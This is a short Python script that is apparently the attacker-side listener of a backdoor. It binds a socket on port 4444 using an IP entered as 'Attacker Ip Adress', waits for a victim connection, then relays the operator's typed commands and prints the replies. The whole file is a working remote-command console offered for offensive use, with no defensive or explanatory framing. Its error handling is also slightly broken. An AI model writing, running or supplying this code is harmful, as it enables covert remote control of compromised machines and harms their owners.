import socket
import subprocess as sb
from colorama import Fore

def listen_backdoor():
    try:
        host = input(f"=>{Fore.RED} Attacker Ip Adress: ")
        port=4444

        serv_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serv_sock.bind((host, port))
        serv_sock.listen(1)

        print("Wait Connect  {}...".format(port))
        cnn, adrr = serv_sock.accept()
        print(f"connected -->  {adrr}")

        while True:
            command = input(f"{host} => ")
            if command.lower() == "exit":
                cnn.send(b"exit")

                cnn.close()
                break

            cnn.send(command.encode())
            response = cnn.recv(4096).decode()
            print(f"{response}")
    except KeyError as e:
        print("pls use correct char ->" + e)
